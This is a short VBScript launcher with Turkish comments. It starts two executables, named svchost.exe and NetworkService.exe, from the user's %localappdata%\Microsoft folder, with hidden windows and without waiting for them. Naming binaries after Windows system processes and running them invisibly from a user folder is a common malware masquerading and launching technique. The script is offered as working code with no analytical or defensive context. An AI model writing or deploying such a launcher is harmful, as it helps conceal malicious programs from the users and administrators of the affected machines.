Set WshShell = CreateObject("WScript.Shell")

' Ortam değişkenlerini VBScript'in anlayacağı gerçek yollara çeviriyoruz
localAppData = WshShell.ExpandEnvironmentStrings("%localappdata%")

' Dosyaları arka planda (0) ve beklemeden (false) çalıştır
WshShell.Run """" & localAppData & "\Microsoft\svchost.exe""", 0, false
WshShell.Run """" & localAppData & "\Microsoft\NetworkService.exe""", 0, false
